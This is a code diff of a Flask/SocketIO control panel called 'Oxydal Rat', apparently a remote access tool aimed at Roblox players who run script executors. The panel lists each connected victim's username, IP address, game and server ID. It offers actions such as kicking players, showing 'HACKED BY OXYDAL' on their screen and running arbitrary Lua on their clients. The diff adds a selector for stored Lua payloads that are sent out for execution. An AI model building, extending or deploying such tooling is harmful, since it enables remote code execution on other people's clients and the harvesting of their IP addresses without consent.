@@ -16,7 +16,7 @@ app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ==================== CONFIG AUTH ====================
+# ==================== CONFIG ====================
 LOGIN = "oxydal"           # Change ici
 PASSWORD = "rat123"        # Change ici
 SESSION_DURATION = 24 * 3600
@@ -68,43 +68,38 @@ def require_auth(f):
     wrapper.__name__ = f.__name__
     return wrapper
 
-# ==================== LOGIN PAGE ====================
+# ==================== LOGIN ====================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
-<head>
-<meta charset="UTF-8">
-<title>Oxydal Rat — Login</title>
+<head><meta charset="UTF-8"><title>Oxydal Rat — Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;--text-muted:#94a3b8;}
+    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
-    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 4rem;width:90%;max-width:420px;box-shadow:0 30px 80px rgba(6,182,212,.2);}
-    .logo{margin-bottom:2rem;text-align:center;}
+    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 4rem;max-width:420px;width:90%;box-shadow:0 30px 80px rgba(6,182,212,.2);}
     .logo svg{width:90px;height:90px;fill:var(--primary);}
     h1{font-size:2.2rem;text-align:center;margin-bottom:2rem;color:var(--primary);}
-    input{width:100%;padding:16px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-size:1rem;font-family:'JetBrains Mono',monospace;}
-    input:focus{outline:none;border-color:var(--primary);}
-    button{width:100%;padding:16px;background:linear-gradient(135deg,#06b6d4,#0891b2);border:none;border-radius:12px;color:white;font-weight:600;font-size:1.1rem;cursor:pointer;transition:all .3s;}
+    input{width:100%;padding:16px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-size:1rem;}
+    button{width:100%;padding:16px;background:linear-gradient(135deg,#06b6d4,#0891b2);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;}
     button:hover{transform:translateY(-4px);box-shadow:0 15px 30px rgba(6,182,212,.4);}
     .error{color:#ef4444;margin-top:15px;text-align:center;}
 </style>
 </head>
 <body>
 <div class="login-card">
-    <div class="logo">
+    <div class="logo" style="text-align:center;margin-bottom:2rem;">
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
         <h1>Oxydal Rat</h1>
     </div>
     <form method="post">
         <input type="text" name="login" placeholder="Login" required autofocus>
         <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Se connecter</button>
+        <button type="submit">Connexion</button>
     </form>
     {% if error %}<div class="error">{{ error }}</div>{% endif %}
 </div>
-</body>
-</html>"""
+</body></html>"""
 
 @app.route("/login", methods=["GET", "POST"])
 def login_page():
@@ -138,7 +133,7 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ==================== PANEL HTML (Text Screen simplifié) ====================
+# ==================== PANEL HTML (CORRIGÉ) ====================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -185,9 +180,13 @@ HTML = """<!DOCTYPE html>
     .btn.undo{background:#475569;}
     .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
     .modal.active{display:flex;}
-    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:500px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
-    .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem;}
-    input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
+    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:600px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
+    .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;}
+    input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;}
+    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
+    .payload-item{cursor:pointer;padding:12px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:.2s;}
+    .payload-item:hover{background:#334155;}
+    .payload-item.selected{background:var(--primary);color:black;}
     .modal-buttons{display:flex;gap:1rem;margin-top:1rem;}
     .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;}
     .confirm{background:var(--primary);color:white;}
@@ -216,7 +215,7 @@ HTML = """<!DOCTYPE html>
     </div>
     <div class="content">
         <div id="players-tab" class="tab active">
-            <div class="search-bar"><input type="text" id="searchInput" placeholder="Rechercher joueur..." onkeyup="filterPlayers()"></div>
+            <div class="search-bar"><input type="text" id="searchInput" placeholder="Rechercher..." onkeyup="filterPlayers()"></div>
             <div class="grid" id="players"></div>
         </div>
         <div id="workshop-tab" class="tab" style="display:none;">
@@ -228,20 +227,30 @@ HTML = """<!DOCTYPE html>
 </div>
 
 <!-- Modals -->
-<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
-<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
+<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
+<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="HACKED BY OXYDAL" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
-<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
-<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import File</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
+<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Exécuter Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
+<div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Nouveau Payload</h2><input type="text" id="payloadName" placeholder="Nom"><textarea id="payloadCode" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="savePayload">Sauvegarder</button></div></div></div>
-<div class="modal" id="executePayloadModal"><div class="modal-content"><h2>Payloads</h2><input type="text" id="payloadSearch" placeholder="Rechercher..." onkeyup="filterPayloads()"><div class="payload-list" id="payloadList" style="max-height:300px;overflow-y:auto;margin:10px 0;"></div><textarea id="tempPayloadCode" placeholder="Sélectionne un payload..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="executeTempPayload">Exécuter</button></div></div></div>
+
+<!-- Modal Import Payload (CORRIGÉ) -->
+<div class="modal" id="executePayloadModal"><div class="modal-content">
+    <h2>Importer Payload</h2>
+    <input type="text" id="payloadSearch" placeholder="Rechercher..." onkeyup="filterPayloads()">
+    <div class="payload-list" id="payloadList"></div>
+    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir le code..." style="height:220px;"></textarea>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Annuler</button>
+        <button class="modal-btn confirm" id="executeTempPayload">Exécuter</button>
+    </div>
+</div></div>
 
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
-let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
-let editingPayload = null;
+let currentPlayerId = null;
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(i => i.addEventListener('click', () => {
@@ -266,11 +275,36 @@ function filterPlayers() {
 }
 
 // Modals
-function openKickModal(id) { currentKickId = id; document.getElementById('kickModal').classList.add('active'); document.getElementById('kickReason').focus(); }
-function openPlaySoundModal(id) { currentSoundId = id; document.getElementById('playSoundModal').classList.add('active'); }
-function openTextScreenModal(id) { currentTextId = id; document.getElementById('textScreenModal').classList.add('active'); document.getElementById('screenText').focus(); }
-function openLuaExecModal(id) { currentLuaId = id; document.getElementById('luaExecModal').classList.add('active'); }
-function openImportFileModal(id) { currentImportId = id; document.getElementById('importFileModal').classList.add('active'); }
+function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
+function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
+function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
+function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
+function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
+function openPayloadSelector(id) {
+    currentPlayerId = id;
+    fetch("/payload?action=list").then(r => r.json()).then(data => {
+        const list = document.getElementById("payloadList");
+        list.innerHTML = "";
+        if (Object.keys(data).length === 0) {
+            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload</p>";
+        } else {
+            for (const name of Object.keys(data)) {
+                const item = document.createElement("div");
+                item.className = "payload-item";
+                item.textContent = name;
+                item.onclick = () => {
+                    document.querySelectorAll('.payload-item').forEach(x => x.classList.remove('selected'));
+                    item.classList.add('selected');
+                    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
+                        document.getElementById("tempPayloadCode").value = d.code;
+                    });
+                };
+                list.appendChild(item);
+            }
+        }
+        document.getElementById("executePayloadModal").classList.add("active");
+    });
+}
 
 document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener('click', () => b.closest('.modal').classList.remove('active')));
 
@@ -285,28 +319,29 @@ function sendTroll(id, cmd, param = null) {
     toast(cmd.toUpperCase() + ' envoyé');
 }
 
+// Actions modals
 document.getElementById('confirmKick').onclick = () => {
     const reason = document.getElementById('kickReason').value.trim() || 'Kicked';
-    fetch('/kick', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userid: currentKickId, reason }) });
+    fetch('/kick', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userid: currentPlayerId, reason }) });
     toast('KICK envoyé');
     document.getElementById('kickModal').classList.remove('active');
 };
 
 document.getElementById('confirmSound').onclick = () => {
     const asset = document.getElementById('soundAssetId').value.trim();
-    if (asset) sendTroll(currentSoundId, 'playsound', asset);
+    if (asset) sendTroll(currentPlayerId, 'playsound', asset);
     document.getElementById('playSoundModal').classList.remove('active');
 };
 
 document.getElementById('confirmText').onclick = () => {
     const text = document.getElementById('screenText').value.trim();
-    if (text) sendTroll(currentTextId, 'textscreen', text);
+    if (text) sendTroll(currentPlayerId, 'textscreen', text);
     document.getElementById('textScreenModal').classList.remove('active');
 };
 
 document.getElementById('confirmLua').onclick = () => {
     const script = document.getElementById('luaScript').value.trim();
-    if (script) sendTroll(currentLuaId, 'luaexec', script);
+    if (script) sendTroll(currentPlayerId, 'luaexec', script);
     document.getElementById('luaExecModal').classList.remove('active');
 };
 
@@ -314,61 +349,25 @@ document.getElementById('confirmImport').onclick = () => {
     const file = document.getElementById('luaFileInput').files[0];
     if (!file) return toast('Aucun fichier');
     const reader = new FileReader();
-    reader.onload = e => { sendTroll(currentImportId, 'luaexec', e.target.result); document.getElementById('importFileModal').classList.remove('active'); };
+    reader.onload = e => { sendTroll(currentPlayerId, 'luaexec', e.target.result); document.getElementById('importFileModal').classList.remove('active'); };
     reader.readAsText(file);
 };
 
-// Payloads (workshop)
-function loadPayloads() {
-    fetch('/payload?action=list').then(r => r.json()).then(data => {
-        const list = document.getElementById('payloads-list');
-        list.innerHTML = Object.keys(data).length === 0 ? '<p style="color:#94a3b8">Aucun payload</p>' : '';
-        for (const [name, code] of Object.entries(data)) {
-            const div = document.createElement('div');
-            div.className = 'payload-item';
-            div.style = 'background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';
-            div.innerHTML = `<strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substr(0,100)}${code.length>100?'...':''}</span>
-                <div style="margin-top:10px;">
-                    <button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name}')">Edit</button>
-                    <button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name}')">Suppr</button>
-                </div>`;
-            list.appendChild(div);
-        }
+document.getElementById('executeTempPayload').onclick = () => {
+    const code = document.getElementById('tempPayloadCode').value.trim();
+    if (!code) return toast('Aucun code');
+    sendTroll(currentPlayerId, 'luaexec', code);
+    document.getElementById('executePayloadModal').classList.remove('active');
+};
+
+function filterPayloads() {
+    const q = document.getElementById('payloadSearch').value.toLowerCase();
+    document.querySelectorAll('.payload-item').forEach(i => {
+        i.style.display = i.textContent.toLowerCase().includes(q) ? 'block' : 'none';
     });
 }
 
-document.getElementById('newPayloadBtn').onclick = () => {
-    editingPayload = null;
-    document.getElementById('payloadModalTitle').textContent = 'Nouveau Payload';
-    document.getElementById('payloadName').value = '';
-    document.getElementById('payloadCode').value = '';
-    document.getElementById('payloadModal').classList.add('active');
-};
-
-window.editPayload = name => fetch(`/payload?action=get&name=${encodeURIComponent(name)}`).then(r => r.json()).then(d => {
-    editingPayload = name;
-    document.getElementById('payloadModalTitle').textContent = 'Modifier Payload';
-    document.getElementById('payloadName').value = name;
-    document.getElementById('payloadCode').value = d.code;
-    document.getElementById('payloadModal').classList.add('active');
-});
-
-window.deletePayload = name => confirm('Supprimer ' + name + ' ?') && fetch('/payload', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',name})}).then(() => { toast('Supprimé'); loadPayloads(); });
-
-document.getElementById('savePayload').onclick = () => {
-    const name = document.getElementById('payloadName').value.trim();
-    const code = document.getElementById('payloadCode').value;
-    if (!name || !code) return toast('Nom + code requis');
-    fetch('/payload', {method:'POST',headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({action: editingPayload ? 'update' : 'create', name, code, oldname: editingPayload})
-    }).then(() => {
-        toast(editingPayload ? 'Modifié' : 'Créé');
-        document.getElementById('payloadModal').classList.remove('active');
-        loadPayloads();
-    });
-};
-
-// Render players
+// Render
 function render(data) {
     document.getElementById('stats').innerText = data.online;
     const grid = document.getElementById('players');
@@ -379,7 +378,12 @@ function render(data) {
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online?'online':''}"></div><span>${p.online?'Online':'Offline'}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a></div>
+            <div class="info">
+                Executor: ${p.executor}<br>
+                IP: ${p.ip}<br>
+                Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>
+                JobId: ${p.jobId || "N/A"}
+            </div>
             <div class="category">TROLLS</div>
             <div class="btn-grid">
                 <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
@@ -465,7 +469,7 @@ def api():
         cmd = pending_commands.pop(uid)
         res = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
         if isinstance(cmd, dict):
-            res.update({k: cmd[k] for k in cmd if k in ["assetId", "text", "script"]})
+            res.update({k: cmd[k] for k in ["assetId", "text", "script"] if k in cmd})
         return jsonify(res)
     return jsonify({})
 
@@ -492,7 +496,7 @@ def troll():
         details = cmd.upper()
         if "assetId" in data: payload["assetId"] = data["assetId"]; details += f" ({data['assetId']})"
         if "text" in data: payload["text"] = data["text"]; details += f" ({data['text']})"
-        if "script" in data: payload["script"] = data["script"]; details += f" (Script {len(data['script'])}c)"
+        if "script" in data: payload["script"] = data["script"]; details += " (Lua)"
         pending_commands[uid] = payload
         name = connected_players.get(uid, {}).get("username", "Unknown")
         add_history("action", name, details)
@@ -518,7 +522,7 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
-# ==================== BROADCAST LOOP ====================
+# ==================== LOOP ====================
 def broadcast_loop():
     while True:
         now = time.time()
